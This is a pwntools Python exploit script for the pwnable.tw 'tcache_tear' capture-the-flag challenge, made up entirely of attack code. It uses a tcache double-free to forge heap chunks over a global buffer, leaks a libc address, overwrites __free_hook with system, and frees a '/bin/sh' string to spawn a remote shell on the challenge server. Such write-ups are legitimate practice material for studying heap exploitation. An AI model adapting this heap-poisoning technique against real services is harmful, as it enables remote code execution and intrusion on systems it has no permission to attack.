from pwn import *
import sys

#context.arch = "amd64"
server = remote("chall.pwnable.tw", 10207)
elf = ELF("./tcache_tear")
libc = ELF("./libc.so")
env = {"LD_PRELOAD":"./libc.so"}

def malloc(size, data):
    server.recvuntil("Your choice :")
    server.sendline("1")
    server.recvuntil("Size:")
    server.sendline(str(size))
    server.recvuntil("Data:")
    server.sendline(data)


def free():
    server.recvuntil("Your choice :")
    server.sendline("2")


def info():
    server.recvuntil("Your choice :")
    server.sendline("3")


name_address = 0x602060
ptr_address = 0x602088

server.recvuntil("Name:")
server.sendline("1212")

# make fake chunk to avoid fake name chunk unlink and free check
malloc(0x70, "12")
free()
free()
malloc(0x70, p64(name_address+0x500-0x10))
malloc(0x70, '1212')
malloc(0x70, p64(0)+p64(0x21)+p64(0)*3+p64(0x21))

# make fake name chunk
malloc(0x60, "1212")
free()
free()
malloc(0x60, p64(name_address-0x10))
malloc(0x60, '1212')
 ## overwrite ptr pointer to avoid free check
malloc(0x60, p64(0)+p64(0x501)+((ptr_address-name_address)/8)*p64(0)+p64(name_address))

# leak libc address
free()
info()
server.recvuntil("Name :")
main_arena = u64(server.recv(8)) - 96
log.success("main arena address: {0}".format(hex(main_arena)))
libc.address = main_arena - 0x3ebc40
log.success("libc address: {0}".format(hex(libc.address)))

# overwrite free_hook
free_hook_address = libc.symbols['__free_hook']
system_address = libc.symbols['system']
malloc(0x50, "1212")
free()
free()
malloc(0x50, p64(free_hook_address))
malloc(0x50, "1212")
malloc(0x50, p64(system_address))

malloc(0x40, "/bin/sh\x00")
free()
server.interactive()